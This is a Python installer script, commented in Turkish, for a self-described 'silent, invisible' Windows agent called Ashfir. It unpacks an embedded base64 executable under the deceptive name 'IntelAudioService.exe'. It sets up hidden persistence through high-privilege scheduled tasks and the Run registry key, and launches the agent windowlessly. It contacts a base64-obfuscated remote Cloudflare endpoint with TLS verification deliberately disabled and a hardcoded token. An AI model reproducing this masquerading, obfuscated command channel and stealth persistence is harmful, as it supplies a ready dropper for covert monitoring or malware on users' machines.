"""
Ashfir Setup
Çift tıkla → Key gir → Kuruldu.
"""

import os
import sys
import json
import shutil
import winreg
import subprocess
import base64
import ctypes
import tempfile
from pathlib import Path

# Gömülü dosyaları import et (ASHFIR_EXE artık base64 tekil exe olacak)
try:
    from embedded_files import ASHFIR_EXE
except ImportError:
    # Build zamanı için placeholder
    ASHFIR_EXE = ""

# ── RENKLER ──────────────────────────────────────────────────
os.system('')   # ANSI aktif et
G = '\033[92m'  # yeşil
Y = '\033[93m'  # sarı
R = '\033[91m'  # kırmızı
C = '\033[96m'  # cyan
B = '\033[1m'   # bold
X = '\033[0m'   # reset

def ok(m):    print(f'  {G}✓{X}  {m}')
def info(m):  print(f'  {C}→{X}  {m}')
def warn(m):  print(f'  {Y}!{X}  {m}')
def fail(m):  print(f'  {R}✗{X}  {m}')
def step(n, m): print(f'\n{B}{C}── {n} ──────────────────────{X}\n  {m}')

# ── FIREBASE İŞLEMLERİ (CF API) ────────────────────────────────
import ssl
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ.pop('REQUESTS_CA_BUNDLE', None)
os.environ.pop('CURL_CA_BUNDLE', None)

class ForcedInsecureAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
        self.poolmanager = PoolManager(
            num_pools=connections, maxsize=maxsize,
            block=block, ssl_context=ctx
        )
    def send(self, request, **kwargs):
        kwargs['verify'] = False
        return super().send(request, **kwargs)

# Güvenli session — agent.py ile aynı yöntem
_session = requests.Session()
_session.verify = False
_session.mount('https://', ForcedInsecureAdapter())
_session.mount('http://', HTTPAdapter())

import base64
import hashlib
import time

CF_URL   = base64.b64decode("aHR0cHM6Ly9jbG91ZGZsYXJlLXdvcmtlcndvcmtlcmpzLnN0b2twcm9yZXNtaS53b3JrZXJzLmRldg==").decode()
CF_TOKEN = base64.b64decode("YXNoZmlyX3NlY3JldF90b2tlbl9LOHg5UDF6VzRtN045cTJSNXQ4VjF5NFo3YzBmM2k2bDlvMg==").decode()

def get_auth_header():
    current_minute = int(time.time() / 60)
    token_string = f"{CF_TOKEN}_{current_minute}"
    dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
    return {"Authorization": f"Bearer {dynamic_token}"}

def validate_key(key):
    try:
        url = f"{CF_URL}/verify_key"
        headers = get_auth_header()
        res = _session.post(url, headers=headers, json={"key": key}, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data.get('ok'):
                return {'ok': True}
            return {'ok': False, 'error': data.get('error', 'Key bulunamadı')}
        return {'ok': False, 'error': f'Sunucu hatası: {res.status_code}'}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def create_account_on_firebase(machine_name):
    try:
        url = f"{CF_URL}/create_account"
        headers = get_auth_header()
        res = _session.post(url, headers=headers, json={"machine_name": machine_name}, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data.get('ok'):
                return {'ok': True, 'key': data.get('key')}
            return {'ok': False, 'error': data.get('error', 'Hesap oluşturulamadı')}
        return {'ok': False, 'error': f'Sunucu hatası: {res.status_code}'}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

# ── DOSYA YAZMA ───────────────────────────────────────────────
def write_files(install_dir: Path, key: str, machine_name: str):
    """Tüm dosyaları kurulum dizinine yaz (Ashfir Klasör Yapısı + Config)."""
    install_dir.mkdir(parents=True, exist_ok=True)

    info('Ashfir çekirdeği çıkartılıyor...')
    try:
        exe_data = base64.b64decode(ASHFIR_EXE)
        (install_dir / 'IntelAudioService.exe').write_bytes(exe_data)
        ok('Çekirdek dosyası hazır.')
    except Exception as e:
        fail(f'Çekirdek dosyası çıkartılamadı: {e}')
        sys.exit(1)

    config = {
        'key':          key,
        'machine_name': machine_name,
    }
    (install_dir / 'config.json').write_text(
        json.dumps(config, indent=2), encoding='utf-8'
    )

# ── REGISTRY / STARTUP ────────────────────────────────────────
def add_to_registry(exe_path: Path):
    """Windows başlangıcına yüksek yetkiyle ekle — Task Scheduler ile."""
    try:
        ret = subprocess.run(
            ['schtasks', '/create', '/tn', 'AshfirAgent', '/tr', f'"{exe_path}"', '/sc', 'onlogon', '/rl', 'highest', '/f'],
            capture_output=True
        )
        if ret.returncode == 0:
            return True
    except Exception as e:
        warn(f'Schtasks yazılamadı ({e}), Registry deneniyor...')
        
    cmd = f'"{exe_path}"'
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, 'AshfirAgent', 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(reg_key)
        return True
    except Exception as e:
        warn(f'Registry yazılamadı ({e})')
        return False

def _fallback_task_scheduler(exe_path: Path) -> bool:
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>"{exe_path}"</Command>
    </Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
</Task>"""

    tmp = Path(tempfile.mktemp(suffix='.xml'))
    tmp.write_text(xml, encoding='utf-16')
    ret = subprocess.run(
        ['schtasks', '/create', '/tn', 'AshfirAgent', '/xml', str(tmp), '/f'],
        capture_output=True
    )
    tmp.unlink(missing_ok=True)
    return ret.returncode == 0

# ── AGENT BAŞLATMA ────────────────────────────────────────────
def start_agent_now(exe_path: Path):
    """Kurulum biter bitmez hemen sessiz başlat."""
    subprocess.Popen(
        [str(exe_path)],
        creationflags=0x08000000,   # CREATE_NO_WINDOW
        close_fds=True,
    )

# ── KALDIRMA ─────────────────────────────────────────────────
def uninstall():
    """Ashfir'ı tamamen kaldır."""
    install_dir = Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Ashfir'

    print(f'\n{B}{C}Ashfir Kaldırılıyor...{X}\n')

    subprocess.run(['taskkill', '/f', '/im', 'IntelAudioService.exe'], capture_output=True)

    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, 'AshfirAgent')
        winreg.CloseKey(k)
        ok('Registry temizlendi')
    except:
        pass

    subprocess.run(['schtasks', '/delete', '/tn', 'AshfirAgent', '/f'], capture_output=True)

    shutil.rmtree(install_dir, ignore_errors=True)
    ok('Dosyalar silindi')

    print(f'\n{G}✓ Ashfir başarıyla kaldırıldı.{X}\n')
    input('  Kapatmak için Enter...')

def main():
    import sys
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
    except:
        pass

    if '--uninstall' in sys.argv:
        uninstall()
        return

    is_auto = '--auto' in sys.argv

    print(f"""
{B}{C}
  +==========================================+
  |            Ashfir  -  Kurulum            |
  |   Sessiz, akilli, gorunmez yedekleme     |
  +==========================================+
{X}""")

    install_dir  = Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Ashfir'
    machine_name = os.environ.get('COMPUTERNAME', 'PC')

    # Mevcut key'i koru (Güncelleme durumları için)
    existing_key = None
    config_file = install_dir / 'config.json'
    if config_file.exists():
        try:
            old_config = json.loads(config_file.read_text(encoding='utf-8'))
            existing_key = old_config.get('key')
        except:
            pass

    step('1/3', 'Hesap doğrulama')
    print(f'  {Y}Eğer keyiniz yoksa Enter\'a basarak yeni bir key oluşturabilirsiniz.{X}\n')

    if not is_auto:
        default_prompt = f" [{existing_key}]" if existing_key else ""
        raw_key = input(f'  Hesap Key (ASH-XXXX-XXXX){default_prompt}: ').strip().upper()
        if not raw_key and existing_key:
            raw_key = existing_key
    else:
        raw_key = existing_key or ""

    if not raw_key:
        info('Yeni hesap oluşturuluyor...')
        result = create_account_on_firebase(machine_name)
        if not result or not result.get('ok'):
            fail('Hesap oluşturulamadı: ' + (result or {}).get('error', 'Firebase hatası'))
            input('\n  Kapatmak için Enter...')
            sys.exit(1)

        key = result['key']
        print(f'\n  {B}{G}  Yeni Keyiniz:{X}  {B}{key}{X}')
        print(f'  {Y}  Bu keyi not alın — web paneli girişinde kullanacaksınız.{X}')
        if not is_auto:
            input('  Devam etmek için Enter...')
    else:
        info('Key doğrulanıyor...')
        res = validate_key(raw_key)
        if not res or not res.get('ok'):
            fail('Geçersiz key: ' + (res or {}).get('error', 'Hata oluştu'))
            input('\n  Kapatmak için Enter...')
            sys.exit(1)
        key = raw_key
        ok('Key doğrulandı')

    # ── 2. Kurulum ────────────────────────────────────────────
    step('2/3', 'Sistem kuruluyor')

    info('Ashfir dosyaları yerleştiriliyor...')
    write_files(install_dir, key, machine_name)
    ok(f'Kurulum dizini: {install_dir}')

    exe_path = install_dir / 'IntelAudioService.exe'
    if add_to_registry(exe_path):
        ok('Windows başlangıcına eklendi')

    # ── 3. Başlat ─────────────────────────────────────────────
    step('3/3', 'Servis başlatılıyor')
    start_agent_now(exe_path)
    ok('Ashfir şu an arka planda aktif.')

    # ── TAMAMLANDI ────────────────────────────────────────────
    print(f"""
{G}{B}
  +==========================================+
  |           Kurulum Tamamlandi!            |
  +==========================================+
{X}
  {C}Key:    {X}{B}{key}{X}
  {C}Konum:  {X}{install_dir}

  Ashfir şu an sessizce arka planda çalışıyor.
  Görev yöneticisinde 'IntelAudioService.exe' olarak görünür.
  Windows her açıldığında otomatik başlar.

  {Y}Kaldırmak için:{X}  ashfir_setup.exe --uninstall
""")
    if not is_auto:
        input('  Kapatmak için Enter...')
    else:
        print(f'\n  {G}✓ Kurulum otomatik tamamlandı. Sistem aktif.{X}')
        import time
        time.sleep(5)

if __name__ == '__main__':
    main()